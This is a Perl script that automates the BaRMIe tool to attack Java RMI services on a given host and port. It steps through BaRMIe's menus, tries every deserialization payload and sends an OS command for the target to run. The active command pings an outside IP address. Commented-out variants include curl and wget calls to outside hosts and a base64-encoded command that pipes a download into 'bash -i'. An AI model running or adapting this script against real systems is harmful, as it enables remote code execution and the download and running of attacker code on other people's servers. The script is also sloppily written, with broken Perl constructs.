#!/usr/bin/perl
###
###
###

use FindBin qw($Bin);
my $jar = "$Bin/BaRMIe_v1.01.jar";
die("jmxterm not found!") if( !(-f $jar)); 
  

use Expect::Simple;

die("ERROR!\n\n$0 <host:port> [attackmode]\n\n") if (@ARGV <1);
my $arg = shift;
my $payload = shift;
$payload = 1 if(@ARGV < 2);
# my $command = 'java -Xrunjdwp:transport=dt_socket,suspend=y,server=162.210.173.220:2011';
# my $command = 'curl 162.210.173.220:8080/brut-rmi';
my $command = 'ping -c 6 162.210.173.220';

# my $command = 'sh -c $@|sh . echo ping 162.210.173.220';
#my $command = 'bash -c {echo,Y3VybCAxNjIuMjEwLjE3My4yMjA6ODA4MC9icnV0LXJtaQ==}|{base64,-d}|{bash,-i}';
my ($host,$port) = split(/:/,$arg);
$port = 1099 if($port < 64000);
print "$host\t$port\n";
my $cmd = "java -jar $jar -attack $host $port" ;
my $obj = new Expect::Simple {
   Cmd => $cmd,
           Prompt => [  -re =>  '[}):]+ $' , "Enumerating 1 target(s)...","Select a payload to use" ,"Select an attack to execute (b to back up, q to quit):" ,"Select a payload to use"],
           DisconnectCmd => 'exit',
           Verbose => 1,
           Debug => 0,
           Timeout => 15,
           RawPty => 1
   };
      
# sleep(3);

$obj->send( $payload );   

      if ( &looping("Select a payload to use") eq true) {

 }
# $text = $obj->after;
# print "$text\n";

sub looping(){
    my $string = shift;
    while() {
	sleep(1);
	print "$string\n";
	
	if($obj->match_str, $string) {
# 	      my $text = $obj->after;
	      my $text = $obj->before;
	      print "$text\n";
	      return true;
	}
    }
}
# }
# 
# sleep(3);   
# # my $text = $obj->after;
# print "$text\n";# $obj->send( "1" );   
my $counter = 0;
while($counter != 2) { $counter++;

      if ( &looping("Select a payload to use") eq true) {
      
	$obj->send( 1 );
      #   $text = $obj->after;	print "$text\n";  
	if ( &looping("Select a payload to use") eq true) {
	  
      #     $text = $obj->after;    print "$text\n";  
	  $obj->send( 1 );
	  #sleep(1);$obj->send( "1" );
      #     $text = $obj->after;	print "$text\n";   
	  if ( &looping("a) Try all available deserialization payloads") eq true) {
		

		$obj->send( a );
		if ( &looping("Enter an OS command to execute") eq true) {
#		  $obj->send( 'wget 0b662d10.ngrok.io' );  
 		  $obj->send( $command );  
		  
		  
	while($counter != 2) {   		  
		    if ( &looping("a) Try all available deserialization payloads") eq true) {

# 			if ( &looping("Select a payload to use") eq true) {
			    $obj->send( a );
# 			}	     
		    }

		    if ( &looping("a) Try all available deserialization payloads") eq true) {

# 			if ( &looping("Select a payload to use") eq true) {
			    $obj->send( a );
# 			}	     
		    };
			if ( &looping("Enter an OS command to execute") eq true) {
			    $obj->send( $command);  
			  };
			if ( &looping("Payload delivered, continue trying payloads") eq true) {
			    $obj->send( A );
			    sleep(2);
			};
# 			if ( &looping("Payload delivered, continue trying payloads") eq true) {
# 			    $obj->send( A );
# 			};
		         if ( &looping("Select a payload to use ") eq true ) {
# 			    sleep(5);
			    $obj->send( 'q' );
		         };
# 		       my $text = $obj->after;
# # 		       print $text."\n";
		       
		      $counter = 2;		     
# 		   }
}		  
# 		    if ( &looping("a) Try all available deserialization payloads") eq true) {

# 			if ( &looping("Select a payload to use") eq true) {
# 			    $obj->send( "a" );
# 			}	     
# 		    }

		
	      }
	      
	  }

	}

      }
}
#Select a payload to use
# sleep(5); 

  #    
#    $obj->send( "Y" );
   
   
# &looping();  
# while (prompt( -in => *STDIN , -out => *STDOUT )) {
# #     next if (!($_));
#     my $res = $_;
#     chomp($res);
#     warn $@ if $@;
# 
# $obj->send( $res );
# my $text = $obj->before;
# 
#   print STDERR "$text";
# 
# }
# 
# 
# close JMX;
